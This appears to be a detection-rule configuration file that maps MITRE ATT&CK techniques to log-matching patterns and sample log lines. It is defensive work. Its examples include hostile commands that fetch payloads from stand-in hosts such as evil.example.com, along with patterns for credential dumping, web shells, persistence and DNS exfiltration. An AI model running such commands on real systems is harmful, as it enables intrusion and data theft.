# services/api/mitre_map.yml
rules:
  # Each rule maps MITRE technique to detection patterns and metadata

  - id: T1059.001
    name: PowerShell
    tactic: Execution
    severity: medium
    tags: [windows, script, remote-exec]
    description: "PowerShell command execution or suspicious PowerShell usage."
    patterns:
      - "powershell.exe"
      - "Set-ExecutionPolicy"
      - "Invoke-Expression"
      - "IEX "
      - "re:(?i)encodedcommand"
      - "re:(?i)-enc(oded)?"
    examples:
      - "2025-10-15 10:12:03 - powershell.exe -EncodedCommand ..."

  - id: T1003
    name: OS Credential Dumping
    tactic: Credential Access
    severity: high
    tags: [credential-theft, windows]
    description: "Tools or activity that attempt to dump credentials from memory or LSASS."
    patterns:
      - "mimikatz"
      - "sekurlsa::logonpasswords"
      - "lsass"
      - "re:(?i)procdump .* -ma"
    examples:
      - "Mimikatz:: sekurlsa::logonpasswords"

  - id: T1078
    name: Valid Accounts
    tactic: Defense Evasion
    severity: medium
    tags: [auth, cloud]
    description: "Use of valid credentials or creation of accounts (console logins, AssumeRole, CreateLoginProfile)."
    patterns:
      - "Successful Console Login"
      - "AssumeRole"
      - "CreateLoginProfile"
      - "re:(?i)login successful"
    examples:
      - "AWS Console login: User=admin Status=Success"

  - id: T1110
    name: Brute Force / Password Guessing
    tactic: Credential Access
    severity: high
    tags: [auth, ssh, web]
    description: "Multiple failed authentication attempts, automated credential guessing or brute force activity."
    patterns:
      - "failed password"
      - "failed login"
      - "authentication failure"
      - "invalid user"
      - "brute force"
      - "multiple failed"
      - "re:(?i)authentication failure for user"
      - "re:(?i)failed password for .* from"
    examples:
      - "Failed password for invalid user root from 10.0.0.5 port 22 ssh2"

  - id: T1021
    name: Remote Services (SSH/RDP/PsExec)
    tactic: Lateral Movement
    severity: medium
    tags: [lateral, remote, ssh, rdp, psexec]
    description: "Remote interactive or command execution via SSH, RDP, PsExec, WMI, or WinRM."
    patterns:
      - "ssh"
      - "sshd"
      - "psExec"
      - "Enter-PSSession"
      - "wmic "
      - "remote desktop"
      - "rdp"
      - "re:(?i)accepted password for .* from"
      - "re:(?i)connection from .* port 3389"
    examples:
      - "Accepted password for user from 10.0.0.2 port 22"

  - id: T1190
    name: Exploit Public-Facing Application
    tactic: Initial Access
    severity: high
    tags: [web, exploit, sql-injection, xss]
    description: "Evidence of exploitation attempts against internet-facing applications (SQLi, XSS, known exploit scanners)."
    patterns:
      - "sqlmap"
      - "SQL injection"
      - "SELECT "
      - "UNION SELECT"
      - "' OR '1'='1'"
      - "<script>"
      - "re:(?i)(union(\\s+all)?\\s+select)"
      - "re:(?i)(\\bselect\\b.+\\bfrom\\b)"
      - "re:(?i)\\b(or|and)\\b\\s+[\\'\\\"]?1[\\'\\\"]?=1"
    examples:
      - "GET /vuln.php?id=1' OR '1'='1' -- 200"

  - id: T1547
    name: Boot or Logon Autostart Execution (Persistence)
    tactic: Persistence
    severity: medium
    tags: [persistence, registry, service]
    description: "Changes to Run keys, scheduled tasks, or service creation indicating persistence."
    patterns:
      - "schtasks /create"
      - "CreateService"
      - "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
      - "re:(?i)new-service"
      - "re:(?i)at \\d+:\\d+"
    examples:
      - "schtasks /create /tn \"Updater\" /tr C:\\malicious.exe /sc onlogon"

  - id: T1041
    name: Exfiltration (HTTP/FTP/S3)
    tactic: Exfiltration
    severity: high
    tags: [exfiltration, data-transfer, cloud-storage]
    description: "Large uploads, transfers to external hosts, or unusual use of storage/FTP endpoints."
    patterns:
      - "ftp"
      - "exfiltrate"
      - "exfiltration"
      - "data transfer"
      - "upload"
      - "large files"
      - "S3PutObject"
      - "re:(?i)put object"
      - "re:(?i)upload .* [0-9]{6,}"
    examples:
      - "PUT /uploads/very_large_file.zip 200"

  - id: T1046
    name: Network Service Discovery
    tactic: Discovery
    severity: medium
    tags: [reconnaissance, scan]
    description: "Port scanning or service discovery activity using nmap/masscan or suspicious repeated connection attempts."
    patterns:
      - "port scan"
      - "nmap"
      - "masscan"
      - "scan detected"
      - "suspicious scanning"
      - "re:(?i)scan detected from"
      - "re:(?i)nmap scan report for"
    examples:
      - "Nmap scan report for 10.0.0.0/24"

  - id: T1071
    name: Command and Control (C2) - Application Layer
    tactic: Command and Control
    severity: high
    tags: [c2, beacon, http, dns]
    description: "Indicators of application-layer command and control, beacons, callbacks, or abnormal periodic outbound connections."
    patterns:
      - "c2"
      - "command and control"
      - "beacon"
      - "callback"
      - "connectback"
      - "re:(?i)user-agent: .*curl/"
      - "re:(?i)\\.exe .* -connect"
      - "re:(?i)dns .* query .* suspicious"
      - "re:(?i)periodic .*heartbeat"
    examples:
      - "Outgoing periodic POST to http://evil.example.com/heartbeat"

  - id: T1218
    name: Signed Binary Proxy Execution
    tactic: Defense Evasion
    severity: medium
    tags: [signed-binaries, living-off-the-land]
    description: "Use of signed or system binaries to proxy execution (e.g., regsvr32, rundll32, mshta)."
    patterns:
      - "regsvr32"
      - "rundll32"
      - "mshta"
      - "re:(?i)regsvr32 .* /s"
    examples:
      - "rundll32.exe"

  - id: T1040
    name: Network Sniffing
    tactic: Discovery
    severity: low
    tags: [sniffing, network]
    description: "Use of packet capture tools or suspicious access to network interfaces."
    patterns:
      - "wireshark"
      - "tcpdump"
      - "re:(?i)pcap"
    examples:
      - "tcpdump -i eth0 -w capture.pcap"

  - id: T1070.004
    name: Clear Windows Event Logs
    tactic: Defense Evasion
    severity: high
    tags: [forensics, evasion]
    description: "Clearance of logs or evidence of log tampering."
    patterns:
      - "wevtutil cl"
      - "Clear-EventLog"
      - "re:(?i)clear event log"
    examples:
      - "wevtutil cl Application"

  - id: T1055
    name: Process Injection
    tactic: Defense Evasion
    severity: high
    tags: [process, injection]
    description: "Indicators of process injection or reflective loading (suspicious CreateRemoteThread, NtUnmapViewOfSection)."
    patterns:
      - "CreateRemoteThread"
      - "NtUnmapViewOfSection"
      - "re:(?i)process hollowing"
    examples:
      - "CreateRemoteThread() called on PID 1234"

  - id: T1566
    name: Phishing
    tactic: Initial Access
    severity: medium
    tags: [email, phishing]
    description: "Delivery of phishing emails or suspicious attachments."
    patterns:
      - "phishing"
      - "malicious attachment"
      - "re:(?i)subject:.*urgent"
      - "re:(?i)click here to"
    examples:
      - "Received suspicious email with attachment invoice.exe"

  - id: T1499
    name: Endpoint Denial of Service
    tactic: Impact
    severity: medium
    tags: [dos]
    description: "Unusually high request rates or resource exhaustion attempts."
    patterns:
      - "DoS"
      - "denial of service"
      - "re:(?i)too many requests"
      - "re:(?i)connection timed out" 
    examples:
      - "HTTP 429 Too Many Requests from 10.0.0.6"

  - id: T1486
    name: Data Encrypted for Impact (Ransomware)
    tactic: Impact
    severity: critical
    tags: [ransomware, encryption]
    description: "Mass file encryption patterns or ransomware related filenames/notes."
    patterns:
      - "ransomware"
      - "encrypted file"
      - "re:(?i)\\.locked$"
      - "re:(?i)ransom note"
    examples:
      - "all .docx files renamed to .locked"

  - id: T1036
    name: Masquerading
    tactic: Defense Evasion
    severity: medium
    tags: [evasion, filename]
    description: "Files or processes using names similar to legitimate binaries."
    patterns:
      - "re:(?i)svchost.exe .* in .*\\\\temp"
      - "re:(?i)\\bnotepad\\.exe\\b.*from.*downloads"
    examples:
      - "C:\\temp\\svchost.exe started by user"

  - id: T1210
    name: Exploitation of Remote Services
    tactic: Initial Access
    severity: high
    tags: [exploit, remote]
    description: "Exploitation against RDP/SSH or other remote services (e.g., BlueKeep-style tests)."
    patterns:
      - "re:(?i)rdp.*vulnerability"
      - "re:(?i)failed to negotiate protocol for rdp"
    examples:
      - "RDP connection attempt using malformed legacy packet"

  - id: T1070.006
    name: File Deletion
    tactic: Defense Evasion
    severity: medium
    tags: [cleanup, evasion]
    description: "Mass deletion of log or artifact files."
    patterns:
      - "rm -rf"
      - "del /f /q"
      - "re:(?i)deleted file"
    examples:
      - "del /f /q C:\\Windows\\Temp\\*"

  - id: T1053
    name: Scheduled Task/Job
    tactic: Persistence
    severity: medium
    tags: [persistence, task]
    description: "Creation or modification of scheduled tasks or cron entries."
    patterns:
      - "cron"
      - "schtasks"
      - "re:(?i)crontab -l"
    examples:
      - "0 3 * * * root /usr/bin/malicious"

  - id: T1204
    name: User Execution
    tactic: Initial Access
    severity: medium
    tags: [user, phishing]
    description: "User executed files or social engineering leading to execution."
    patterns:
      - "double click"
      - "opened attachment"
      - "re:(?i)user clicked"
    examples:
      - "User opened invoice.pdf.exe"

  - id: T1211
    name: Remote File Copy (SMB/FTP)
    tactic: Lateral Movement
    severity: medium
    tags: [lateral, smb, ftp]
    description: "Copying files to remote systems using SMB, FTP or similar protocols."
    patterns:
      - "smbclient"
      - "re:(?i)Net use \""
      - "ftp put"
    examples:
      - "smbclient //10.0.0.5/share -U user%pass"

  - id: T1056
    name: Input Capture (Keylogging)
    tactic: Collection
    severity: medium
    tags: [collection, keylogger]
    description: "Keylogger-related detections or suspicious hooks into input APIs."
    patterns:
      - "keylogger"
      - "GetAsyncKeyState"
    examples:
      - "GetAsyncKeyState called by process 1234"

  - id: T1592
    name: Gather Victim Host Information
    tactic: Discovery
    severity: low
    tags: [discovery, host]
    description: "Commands or calls that enumerate system information (hostname, os, ipconfig, ifconfig)."
    patterns:
      - "hostname"
      - "ipconfig"
      - "ifconfig"
      - "re:(?i)systeminfo"
    examples:
      - "hostname: WIN-EXAMPLE"

  - id: T1057
    name: Process Discovery
    tactic: Discovery
    severity: low
    tags: [discovery, process]
    description: "Listing or querying running processes (tasklist, ps aux)."
    patterns:
      - "tasklist"
      - "ps aux"
      - "re:(?i)get-process"
    examples:
      - "ps aux | grep suspicious"

  # Additional rules for broader coverage
  - id: T1200
    name: Network Traffic Capture (Surreptitious)
    tactic: Collection
    severity: medium
    tags: [network, pcap]
    description: "Commands/tools used for covert capture of network traffic."
    patterns:
      - "re:(?i)tcpdump -i"
      - "re:(?i)wireshark"
      - "re:(?i)dumpcap"
    examples:
      - "tcpdump -i eth0 -w /tmp/creds.pcap"

  - id: T1505
    name: Server Software Component Modification
    tactic: Persistence
    severity: high
    tags: [persistence, web]
    description: "Modification of web server components or configuration to maintain access (web shell upload)."
    patterns:
      - "webshell"
      - "re:(?i)(<?php.*eval\\(|base64_decode\\()"
      - "re:(?i)upload .*webshell"
    examples:
      - "POST /uploads/shell.php 200"

  - id: T1195
    name: Supply Chain Compromise
    tactic: Initial Access
    severity: high
    tags: [supply-chain]
    description: "Indicators that a third-party component or package was tampered with or malicious."
    patterns:
      - "re:(?i)tampered package"
      - "re:(?i)supply-chain"
    examples:
      - "Package xyz@1.2.3 checksum mismatch"

  - id: T1059
    name: Command Shell
    tactic: Execution
    severity: medium
    tags: [shell, os]
    description: "Use of command shell or suspicious command execution."
    patterns:
      - "cmd.exe"
      - "sh -c"
      - "bash -c"
      - "re:(?i)exec\\("
    examples:
      - "/bin/sh -c 'curl http://evil/payload -o /tmp/p'"

  - id: T1052
    name: Exfiltration Over Physical Medium
    tactic: Exfiltration
    severity: low
    tags: [usb, physical]
    description: "Indicators of moving data to removable media or other physical exfiltration channels."
    patterns:
      - "re:(?i)usb .*mount"
      - "re:(?i)copy .* to .*usb"
    examples:
      - "cp /sensitive/file /mnt/usb_drive/file"

  - id: T1048
    name: Exfiltration Over Alternative Protocol
    tactic: Exfiltration
    severity: medium
    tags: [exfiltration, dns]
    description: "Use of DNS, ICMP or other covert channels for data exfiltration."
    patterns:
      - "re:(?i)dns .* txt"
      - "re:(?i)icmp .* payload"
    examples:
      - "DNS TXT query to data.exfil.example.com"

  - id: T1105
    name: Ingress Tool Transfer
    tactic: Command and Control
    severity: medium
    tags: [download, tooling]
    description: "Download of additional tools or payloads from external hosts."
    patterns:
      - "curl -o"
      - "wget"
      - "Invoke-WebRequest"
      - "re:(?i)download .* from"
    examples:
      - "curl -o /tmp/payload http://evil.example.com/p"

  - id: T1213
    name: Data from Information Repositories
    tactic: Collection
    severity: medium
    tags: [database, collection]
    description: "Access or queries against databases that may indicate collection of sensitive info."
    patterns:
      - "SELECT "
      - "re:(?i)select .* from .* where"
      - "re:(?i)jdbc:"
    examples:
      - "SELECT id, ssn FROM users WHERE role='admin'"


